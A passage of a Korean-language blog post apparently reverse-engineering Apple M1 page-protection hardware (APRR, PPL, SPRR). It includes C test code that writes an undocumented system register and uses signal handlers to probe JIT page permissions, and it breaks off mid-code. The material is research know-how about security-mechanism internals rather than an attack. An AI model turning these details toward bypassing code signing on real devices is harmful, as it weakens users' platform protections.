&#xC218;&#xC815;&#xD558;&#xC5EC; JIT &#xD398;&#xC774;&#xC9C0;&#xC5D0; <code>w</code> &#xB300;&#xC2E0; <code>x</code>&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xC5EC; &#xBAA8;&#xB4E0; &#xD398;&#xC774;&#xC9C0;&#xB97C; <code>rw-</code>&#xC5D0;&#xC11C; <code>r-x</code>&#xB85C; &#xC218;&#xC815;&#xD55C;&#xB2E4;.(&#xD639;&#xC740; &#xADF8; &#xBC18;&#xB300;&#xB85C; &#xB3D9;&#xC791;)</p><h2 id="&#xD398;&#xC774;&#xC9C0;-&#xBCF4;&#xD638;-&#xACC4;&#xCE35;-Page-Protection-Layer"><a href="#&#xD398;&#xC774;&#xC9C0;-&#xBCF4;&#xD638;-&#xACC4;&#xCE35;-Page-Protection-Layer" class="headerlink" title="&#xD398;&#xC774;&#xC9C0; &#xBCF4;&#xD638; &#xACC4;&#xCE35;(Page Protection Layer)"></a>&#xD398;&#xC774;&#xC9C0; &#xBCF4;&#xD638; &#xACC4;&#xCE35;(Page Protection Layer)</h2><p>&#xC560;&#xD50C;&#xC740; &#xAC00;&#xB2A5;&#xD55C; &#xD55C; &#xBAA8;&#xB4E0; &#xC2E4;&#xD589; &#xAC00;&#xB2A5;&#xD55C; &#xD398;&#xC774;&#xC9C0;&#xC5D0; code signing&#xC744; &#xC694;&#xAD6C;&#xD55C;&#xB2E4;. iOS&#xC5D0;&#xC11C;&#xB294; &#xC560;&#xD50C;&#xC5D0;&#xC11C; &#xC774; &#xC11C;&#xBA85;&#xC744; &#xAC00;&#xC838;&#xC640;&#xC57C; &#xD558;&#xACE0; macOS&#xC5D0;&#xC11C;&#xB294; &#xB85C;&#xCEEC;&#xB85C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB294; ad-hoc(&#xC784;&#xC2DC;) &#xC11C;&#xBA85;&#xC774; &#xC788;&#xB2E4;. Code signing&#xC740; &#xBCF4;&#xD1B5; &#xCEE4;&#xB110;&#xC5D0; &#xC758;&#xD574; &#xC2DC;&#xD589;&#xB41C;&#xB2E4;. &#xCEE4;&#xB110;&#xC740; &#xB514;&#xBC14;&#xC774;&#xC2A4; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xAC19;&#xC740; &#xCF54;&#xB4DC;&#xB97C; &#xB9CE;&#xC774; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC73C;&#xBBC0;&#xB85C; attack surface&#xAC00; &#xAD49;&#xC7A5;&#xD788; &#xD06C;&#xB2E4;. &#xBAA8;&#xB4E0; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; &#xBAA8;&#xB4E0; &#xBC84;&#xADF8;&#xB294; code signing&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xC774;&#xC288;&#xB294; &#xC624;&#xB798;&#xC804; &#xBE44;&#xB514;&#xC624; &#xAC8C;&#xC784; &#xCF58;&#xC194; <a href="https://free60project.github.io/wiki/Hypervisor/">&#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC18C;&#xD504;&#xD2B8; Xbox 360 &#xD558;&#xC774;&#xD37C;&#xBC14;&#xC774;&#xC800;</a>&#xC5D0;&#xC11C; &#xD574;&#xACB0;&#xB418;&#xC5C8;&#xB2E4;. &#xBAA8;&#xB4E0; &#xCEE4;&#xB110; &#xCF54;&#xB4DC;&#xC5D0; exploitable &#xD55C; &#xBC84;&#xADF8;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xB300;&#xC2E0;&#xC5D0; &#xD558;&#xC774;&#xD37C;&#xBC14;&#xC774;&#xC800; &#xC790;&#xCCB4;&#xC5D0; &#xBC84;&#xADF8;&#xAC00; &#xC788;&#xB294;&#xC9C0;&#xB9CC; &#xD655;&#xC778;&#xD558;&#xBA74; &#xB41C;&#xB2E4;.</p><p>&#xBE44;&#xC2B7;&#xD558;&#xAC8C; &#xC560;&#xD50C;&#xC740; &#xCEE4;&#xB110; &#xB0B4;&#xBD80;&#xC5D0; &#xB9E4;&#xC6B0; &#xB0AE;&#xC740; &#xC624;&#xBC84;&#xD5E4;&#xB4DC;&#xB97C; &#xAC00;&#xC9C4; &#xD558;&#xC774;&#xD37C;&#xBC14;&#xC774;&#xC800;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xAE30; &#xC704;&#xD574; APRR&#xC744; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;. &#xCCAB; &#xBC88;&#xC9F8;&#xB85C; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14;(&#xC911;&#xC694;&#xD55C; &#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870;&#xB97C; &#xAC00;&#xC9C4; &#xBA54;&#xBAA8;&#xB9AC;)&#xACFC; &#xAD8C;&#xD55C; &#xCF54;&#xB4DC; &#xC139;&#xC158; PPL&#xC744; &#xCEE4;&#xB110; &#xC790;&#xCCB4;&#xC5D0; &#xC77D;&#xAE30; &#xC804;&#xC6A9;&#xC73C;&#xB85C; &#xB9E4;&#xD551;&#xD55C;&#xB2E4;. <a href="https://ko.wikipedia.org/wiki/%ED%8A%B8%EB%9E%A8%ED%8E%84%EB%A6%B0_(%EC%BB%B4%ED%93%A8%ED%8C%85">trampoline</a>) &#xD568;&#xC218;&#xB294; APRR&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14;&#xC744; <code>rw-</code>&#xB85C; &#xB2E4;&#xC2DC; &#xB9E4;&#xD551;&#xD558;&#xACE0; PPL &#xCF54;&#xB4DC;&#xB97C; <code>r-x</code>&#xB85C; &#xB9E4;&#xD551;&#xD55C; &#xD6C4; &#xC810;&#xD504;&#xD55C;&#xB2E4;. &#xC774; trampoline &#xD568;&#xC218;&#xB294; PPL &#xCF54;&#xB4DC;&#xC758; &#xC720;&#xC77C;&#xD55C; &#xC5D4;&#xD2B8;&#xB9AC; &#xD3EC;&#xC778;&#xD2B8;&#xC774;&#xBBC0;&#xB85C; hypercall &#xBA85;&#xB839;&#xC5B4;&#xCC98;&#xB7FC; &#xB3D9;&#xC791;&#xD558;&#xBA70; PPL &#xC790;&#xCCB4;&#xB294; &#xC624;&#xBC84; &#xD5E4;&#xB4DC;&#xAC00; &#xB9E4;&#xC6B0; &#xB0AE;&#xC740; &#xD558;&#xC774;&#xD37C;&#xBC14;&#xC774;&#xC800;&#xCC98;&#xB7FC; &#xB3D9;&#xC791;&#xD55C;&#xB2E4;.</p><p>&#xC0C1;&#xC138;&#xD55C; &#xB0B4;&#xC6A9;&#xC740; <a href="http://newosxbook.com/articles/CasaDePPL.html">Jonathan&#xC758; Casa De P(a)P(e)L write up</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><h1 id="SPRR"><a href="#SPRR" class="headerlink" title="SPRR"></a>SPRR</h1><h2 id="Userland-JIT"><a href="#Userland-JIT" class="headerlink" title="Userland JIT"></a>Userland JIT</h2><p>&#xC560;&#xD50C; &#xC2E4;&#xB9AC;&#xCF58;&#xC758; JIT&#xC740; <code>rw-</code>&#xC640; <code>r-x</code> &#xAD8C;&#xD55C;&#xC744; &#xBE60;&#xB974;&#xAC8C; &#xC804;&#xD658;&#xD558;&#xAE30; &#xC704;&#xD574; &#xD2B9;&#xC218;&#xD55C; &#xC601;&#xC5ED;&#xC744; &#xD560;&#xB2F9;&#xBC1B;&#xB294;&#xB2E4;. &#xC774;&#xC804; SoC&#xC5D0;&#xC11C; APRR&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC2DC;&#xD589;&#xB418;&#xC5C8;&#xB2E4;.</p><p><a href="https://developer.apple.com/documentation/apple-silicon/porting-just-in-time-compilers-to-apple-silicon">Just-in-Time &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xC5D0; &#xB300;&#xD55C; &#xC560;&#xD50C;&#xC758; &#xACF5;&#xC2DD; &#xBB38;&#xC11C;</a>&#xC5D0;&#xC11C; M1&#xC5D0;&#xC11C; &#xC774;&#xB7EC;&#xD55C; &#xC804;&#xD658;&#xC740; &#xC5EC;&#xC804;&#xD788; <code>_pthread_jit_write_protect_np</code> &#xD568;&#xC218;&#xAC00; &#xC218;&#xD589;&#xD568;&#xC744; &#xC54C; &#xC218; &#xC788;&#xB2E4;. <code>otool -xv /usr/lib/system/libsystem_pthread.dylib</code>&#xC744; &#xD1B5;&#xD574; &#xC5B4;&#xB5A0;&#xD55C; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xC790;.</p><pre><code class="hljs apache"><span class="hljs-attribute">_pthread_jit_write_protect_np</span>:[...]<span class="hljs-attribute">0000000000007fdc</span>        movk    x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xc<span class="hljs-number">118</span><span class="hljs-attribute">0000000000007fe0</span>        movk    x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xffff, lsl #<span class="hljs-number">16</span><span class="hljs-attribute">0000000000007fe4</span>        movk    x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xf, lsl #<span class="hljs-number">32</span><span class="hljs-attribute">0000000000007fe8</span>        movk    x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span>, lsl #<span class="hljs-number">48</span><span class="hljs-attribute">0000000000007fec</span>        ldr     x<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]                ; Latency: 4</span><span class="hljs-meta">0000000000007ff0        msr     S3_6_C15_C1_5, x0</span><span class="hljs-meta">0000000000007ff4        isb</span><span class="hljs-meta">[...]</span></code></pre><p>&#xC8FC;&#xC18C; <code>0xffffc118</code>&#xC5D0;&#xC11C; 64&#xBE44;&#xD2B8; &#xC815;&#xC218;&#xB97C; &#xB85C;&#xB4DC;&#xD55C; &#xD6C4; <code>s3_6_c15_c1_5</code> &#xC2DC;&#xC2A4;&#xD15C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xC791;&#xC131;&#xD55C;&#xB2E4;. <code>0xffffc110</code>&#xC5D0;&#xC11C; &#xC0C8;&#xB85C;&#xC6B4; &#xC2DC;&#xC2A4;&#xD15C; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xAC12;&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xB294; &#xBE44;&#xC2B7;&#xD55C; &#xCF54;&#xB4DC;&#xAC00; &#xB354; &#xC788;&#xB2E4;. &#xC774; &#xC8FC;&#xC18C;&#xB4E4;&#xC740; &#xBAA8;&#xB4E0; &#xC720;&#xC800; &#xB79C;&#xB4DC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xB9E4;&#xD551;&#xB418;&#xACE0; &#xCEE4;&#xB110;&#xC774; &#xC720;&#xC800; &#xB79C;&#xB4DC;&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xB9CE;&#xC740; &#xBCC0;&#xC218;&#xB97C; &#xD3EC;&#xD568;&#xD55C; commpage &#xC601;&#xC5ED;&#xC774;&#xB2E4;.</p><p>&#xC624;&#xD508; &#xC18C;&#xC2A4; XNU &#xCF54;&#xB4DC;&#xC5D0;&#xB294; commpage &#xB0B4;&#xBD80;&#xC5D0; &#xC774; &#xBCC0;&#xC218;&#xB4E4;&#xC744; &#xC124;&#xC815;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xC5C6;&#xC9C0;&#xB9CC; &#xC774;&#xC804; &#xC138;&#xB300; APRR&#xC5D0; &#xC0AC;&#xC6A9;&#xB41C; <code>cp_aprr_shadow_jit_rw</code>&#xC5D0; &#xB300;&#xD55C; &#xCC38;&#xC870; &#xCF54;&#xB4DC;&#xAC00; &#xB0A8;&#xC544;&#xC788;&#xB2E4;.</p><p>&#xC774; C &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xB364;&#xD504; &#xD574;&#xBCF4;&#xC790;</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">uint64_t</span> *sprr = (<span class="hljs-keyword">uint64_t</span> *)<span class="hljs-number">0xfffffc110</span>;  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%llx %llx\n&quot;</span>, sprr[<span class="hljs-number">0</span>], sprr[<span class="hljs-number">1</span>]);}</code></pre><p><code>0x2010000030300000</code>&#xACFC; <code>0x2010000030100000</code> &#xAC12;&#xC744; &#xD1B5;&#xD574; JIT &#xD398;&#xC774;&#xC9C0;&#xC758; <code>r-x</code>&#xC640; <code>rw-</code> &#xAD8C;&#xD55C;&#xC744; &#xC804;&#xD658;&#xD55C;&#xB2E4;. &#xC774;&#xB294; APRR&#xACFC; &#xC720;&#xC0AC;&#xD558;&#xC9C0;&#xB9CC; &#xB2E4;&#xB978; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA70; &#xB2E4;&#xB978; magic number&#xB97C; &#xD3EC;&#xD568;&#xD55C;&#xB2E4;.</p><p>SPRR&#xC5D0; &#xB300;&#xD55C; &#xB300;&#xB7B5;&#xC801;&#xC778; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xCEE4;&#xB110;&#xC744; disassemble &#xD558;&#xACE0; &#xC774; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB098; &#xADFC;&#xCC98; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD568;&#xC218;&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xC6B0;&#xB9AC;&#xAC00; &#xCC3E;&#xC740; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0;&#xC11C; &#xBE44;&#xD2B8;&#xB97C; &#xC218;&#xC815;&#xD558;&#xACE0; &#xC5B4;&#xB5BB;&#xAC8C; &#xC791;&#xB3D9;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC790;. M1&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC77C;&#xBC18; &#xC720;&#xC800; &#xB79C;&#xB4DC; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C;&#xB3C4; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;.</p><p>&#xBAA8;&#xB4E0; &#xBE44;&#xD2B8;&#xB97C; 0&#xACFC; 1&#xB85C; &#xC124;&#xC815;</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">write_sprr</span><span class="hljs-params">(<span class="hljs-keyword">uint64_t</span> v)</span></span><span class="hljs-function"></span>{    __asm__ __volatile__(<span class="hljs-string">&quot;msr S3_6_c15_c1_5, %0\n&quot;</span>                         <span class="hljs-string">&quot;isb sy\n&quot;</span> ::<span class="hljs-string">&quot;r&quot;</span>(v)                         :);}<span class="hljs-function"><span class="hljs-keyword">uint64_t</span> <span class="hljs-title">read_sprr</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">uint64_t</span> v;    __asm__ __volatile__(<span class="hljs-string">&quot;isb sy\n&quot;</span>                         <span class="hljs-string">&quot;mrs %0, S3_6_c15_c1_5\n&quot;</span>                         : <span class="hljs-string">&quot;=r&quot;</span>(v)::<span class="hljs-string">&quot;memory&quot;</span>);    <span class="hljs-keyword">return</span> v;}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; ++i) {        write_sprr(<span class="hljs-number">1U</span>LL&lt;&lt;i);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bit %02d: %016llx\n&quot;</span>, i, read_sprr());    }</code></pre><p>commpage&#xC5D0;&#xC11C; &#xCC3E;&#xC740; &#xB450; &#xAC12;&#xC774; &#xB2E4;&#xB978; &#xB450; &#xBE44;&#xD2B8;&#xB97C; &#xC81C;&#xC678;&#xD55C; &#xBAA8;&#xB4E0; &#xBE44;&#xD2B8;&#xAC00; initial value&#xB85C; &#xC7A0;&#xACBC;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; JIT &#xD398;&#xC774;&#xC9C0; &#xAD8C;&#xD55C;&#xACFC; &#xAD00;&#xB828;&#xC774; &#xC788;&#xC74C;&#xC744; &#xC54C; &#xC218; &#xC788;&#xB2E4;. <code>mmap</code>&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xB9E4;&#xD551;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC77D;&#xAE30;&#xB098; &#xC4F0;&#xAE30;&#xAC00; &#xBCF4;&#xD638;&#xB41C; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xC77D;&#xAC70;&#xB098; &#xC4F0;&#xBA74; <code>SIGBUS</code>&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xACE0; &#xC2E4;&#xD589; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xD398;&#xC774;&#xC9C0;&#xB85C; &#xC810;&#xD504;&#xD558;&#xBA74; <code>SIGSEV</code>&#xAC00; &#xBC1C;&#xC0DD;&#xD55C;&#xB2E4;. signal handler&#xB97C; &#xD1B5;&#xD574; &#xC720;&#xC800; &#xB79C;&#xB4DC; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; &#xC774;&#xB7EC;&#xD55C; signal&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xBCF4;&#xD638;&#xB41C; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAE30; &#xC704;&#xD574; <code>x0</code>&#xC744; magic constant&#xB85C; &#xC124;&#xC815;&#xD55C; signal handler&#xB97C; &#xC124;&#xC815;&#xD558;&#xACE0; return &#xB418;&#xAE30; &#xC804;&#xC5D0; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xCE74;&#xC6B4;&#xD130;&#xB97C; &#xC99D;&#xAC00;&#xC2DC;&#xD0A8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">bus_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signo, <span class="hljs-keyword">siginfo_t</span> *info, <span class="hljs-keyword">void</span> *cx_)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">ucontext_t</span> *cx = cx_;    cx-&gt;uc_mcontext-&gt;__ss.__x[<span class="hljs-number">0</span>] = <span class="hljs-number">0xdeadbeef</span>;    cx-&gt;uc_mcontext-&gt;__ss.__pc += <span class="hljs-number">4</span>;}</code></pre><p>&#xC2E4;&#xD589; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xBE44;&#xC2B7;&#xD55C; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xD558;&#xBA74; &#xB41C;&#xB2E4;. &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xCE74;&#xC6B4;&#xD130;&#xB97C; &#xB9C1;&#xD06C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB85C; &#xC124;&#xC815;&#xD558;&#xACE0; callee&#xB85C; &#xB3CC;&#xC544;&#xAC00; magic value&#xB97C; <code>x0</code>&#xC5D0; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sev_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signo, <span class="hljs-keyword">siginfo_t</span> *info, <span class="hljs-keyword">void</span> *cx_)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">ucontext_t</span> *cx = cx_;    cx-&gt;uc_mcontext-&gt;__ss.__x[<span class="hljs-number">0</span>] = <span class="hljs-number">0xdeadbeef</span>;    cx-&gt;uc_mcontext-&gt;__ss.__pc = cx-&gt;uc_mcontext-&gt;__ss.__lr;}</code></pre><p>&#xC774;&#xC81C; <code>MAP_JIT</code>&#xC73C;&#xB85C; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xB9E4;&#xD551;&#xD558;&#xACE0; &#xC2DC;&#xC2A4;&#xD15C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xBAA8;&#xB4E0; 4&#xAC1C;&#xC758; &#xAC00;&#xB2A5;&#xD55C; &#xAC12;&#xC744; &#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30; &#xD639;&#xC740; &#xC4F0;&#xAE30;&#xB97C; &#xC2E4;&#xD589;&#xD55C;&#xB2E4;.</p><ul><li><p>SPRR JIT test code</p>  <pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _XOPEN_SOURCE</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/utsname.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ucontext.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sev_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signo, <span class="hljs-keyword">siginfo_t</span> *info, <span class="hljs-keyword">void</span> *cx_)</span></span><span class="hljs-function"></span>{    (<span class="hljs-keyword">void</span>)signo;    (<span class="hljs-keyword">void</span>)info;    <span class="hljs-keyword">ucontext_t</span> *cx = cx_;    cx-&gt;uc_mcontext-&gt;__ss.__x[<span class="hljs-number">0</span>] = <span class="hljs-number">0xdeadbeef</span>;    cx-&gt;uc_mcontext-&gt;__ss.__pc = cx-&gt;uc_mcontext-&gt;__ss.__lr;}<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">bus_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signo, <span class="hljs-keyword">siginfo_t</span> *info, <span class="hljs-keyword">void</span> *cx_)</span></span><span class="hljs-function"></span>{    (<span class="hljs-keyword">void</span>)signo;    (<span class="hljs-keyword">void</span>)info;    <span class="hljs-keyword">ucontext_t</span> *cx = cx_;    cx-&gt;uc_mcontext-&gt;__ss.__x[<span class="hljs-number">0</span>] = <span class="hljs-number">0xdeadbeef</span>;    cx-&gt;uc_mcontext-&gt;__ss.__pc += <span class="hljs-number">4</span>;}<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">write_sprr_perm</span><span class="hljs-params">(<span class="hljs-keyword">uint64_t</span> v)</span></span><span class="hljs-function"></span>{    __asm__ __volatile__(<span class="hljs-string">&quot;msr S3_6_c15_c1_5, %0\n&quot;</span>                         <span class="hljs-string">&quot;isb sy\n&quot;</span> ::<span class="hljs-string">&quot;r&quot;</span>(v)                         :);}<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> <span class="hljs-title">read_sprr_perm</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">uint64_t</span> v;    __asm__ __volatile__(<span class="hljs-string">&quot;isb sy\n&quot;</span>                         <span class="hljs-string">&quot;mrs %0, S3_6_c15_c1_5\n&quot;</span>                         : <span class="hljs-string">&quot;=r&quot;</span>(v)::<span class="hljs-string">&quot;memory&quot;</span>);    <span class="hljs-keyword">return</span> v;}<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">can_read</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">uint64_t</span> v = <span class="hljs-number">0</span>;    __asm__ __volatile__(<span class="hljs-string">&quot;ldr x0, [%0]\n&quot;</span>                         <span class="hljs-string">&quot;mov %0, x0\n&quot;</span>                         : <span class="hljs-string">&quot;=r&quot;</span>(v)                         : <span class="hljs-string">&quot;r&quot;</span>(ptr)                         : <span class="hljs-string">&quot;memory&quot;</span>, <span class="hljs-string">&quot;x0&quot;</span>);    <span class="hljs-keyword">if</span> (v == <span class="hljs-number">0xdeadbeef</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;}<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">can_write</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">uint64_t</span> v = <span class="hljs-number">0</span>;    __asm__ __volatile__(<span class="hljs-string">&quot;str x0, [%0]\n&quot;</span>                         <span class="hljs-string">&quot;mov %0, x0\n&quot;</span>                         : <span class="hljs-string">&quot;=r&quot;</span>(v)                         : <span class="hljs-string">&quot;r&quot;</span>(ptr + <span class="hljs-number">8</span>)                         : <span class="hljs-string">&quot;memory&quot;</span>, <span class="hljs-string">&quot;x0&quot;</span>);    <span class="hljs-keyword">if</span> (v == <span class="hljs-number">0xdeadbeef</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;}<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">can_exec</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">uint64_t</span> (*fun_ptr)(<span class="hljs-keyword">uint64_t</span>) = ptr;    <span class="hljs-keyword">uint64_t</span> res = fun_ptr(<span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span> (res == <span class="hljs-number">0xdeadbeef</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;}<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sprr_test</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr, <span class="hljs-keyword">uint64_t</span> v)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">uint64_t</span> a, b;    a = read_sprr_perm();    write_sprr_perm(v);    b = read_sprr_perm();    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%llx: %c%c%c\n&quot;</span>, b, can_read(ptr) ? <span class="hljs-string">&apos;r&apos;</span> : <span class="hljs-string">&apos;-&apos;</span>, can_write(ptr) ? <span class="hljs-string">&apos;w&apos;</span> : <span class="hljs-string">&apos;-&apos;</span>,           can_exec(ptr) ? <span class="hljs-string">&apos;x&apos;</span> : <span class="hljs-string">&apos;-&apos;</span>);}<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> <span class="hljs-title">make_sprr_val</span><span class="hljs-params">(<span class="hljs-keyword">uint8_t</span> nibble)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">uint64_t</span> res = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i)        res |= ((<span class="hljs-keyword">uint64_t</span>)nibble) &lt;&lt; (<span class="hljs-number">4</span> * i);    <span 